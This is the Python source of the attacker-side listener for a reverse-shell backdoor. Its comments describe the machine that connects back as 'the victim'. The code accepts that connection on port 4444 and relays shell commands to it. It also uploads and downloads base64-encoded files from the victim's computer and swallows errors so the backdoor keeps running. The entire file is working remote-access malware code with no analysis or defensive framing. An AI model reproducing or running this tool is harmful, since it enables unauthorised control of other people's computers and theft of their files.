import socket
import json
import base64


class Listener:

    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        # this enables the option to reuse the socket in case connection drops. Establish a new connection
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

        # listen for incoming connections. this is on hacker machine.
        listener.bind((ip, port))

        # start the listener and accept connections
        listener.listen(0)
        print("[+] Waiting for incoming connections...")

        # 'accept' returns a tuple: socket object to use and source address.
        self.connection, address = listener.accept()
        print("[+] Got a connection from " + str(address) + " !!!!!!")

    def reliable_send(self, data):

        json_data = json.dumps(data)  # convert the data into json object
        self.connection.send(json_data)  # send command to the victim.

    def reliable_receive(self):

        json_data = ''.encode('utf8')

        # keep calling recv until whole object is received
        while True:
            try:
                # Return command result from victim in 1024 bytes
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)  # convert back to original object

            except ValueError:  # object is larger than 1024 bytes. keep calling recv
                continue

    # write the file received from victim's computer
    def write_file(self, path, content):
        file = open(path, "wb")  # create a new file to write the received data to
        file.write(base64.b64decode(content))  # decode base64 to original before writing
        return "[+] Download successful!!!"

    # read file then send to victim
    def read_file(self, path):
        file = open(path, "rb")
        return base64.b64encode(file.read())  # encode to base64 to send jpg, pdf files

    def execute_remotely(self, command_list):
        self.reliable_send(command_list)
        return self.reliable_receive()

    def run(self):

        while True:
            try:
                command = raw_input(">> ")
                command_list = command.split(" ")

                special_commands = ["cd", "upload", "download", "more"]

                # merge file names with spaces into 1 element in the list
                if command_list[0] in special_commands:
                    command_list[1:len(command_list)] = [' '.join(command_list[1:len(command_list)])]

                # close the socket and backdoor on the victim's computer, then exit program
                if command_list[0] == "exit":
                    print("[-] Closing backdoor...")
                    print("[-] Closing connection...")
                    print("[-] Exiting program.")
                    self.reliable_send(command_list)
                    self.connection.close()
                    exit()

                if command_list[0] == "upload":
                    file_contents = self.read_file(command_list[1])
                    command_list.append(file_contents)

                result = self.execute_remotely(command_list)  # execute the command and get the result

                # only write to file if download was successful
                if command_list[0] == "download" and "Error" not in result:
                    result = self.write_file(command_list[1], result)

            except Exception: # catch all exceptions. Continue running the backdoor at all costs
                result = "[-] Error during command execution"

            print(result)


my_listener = Listener("192.168.1.140", 4444)
my_listener.run()
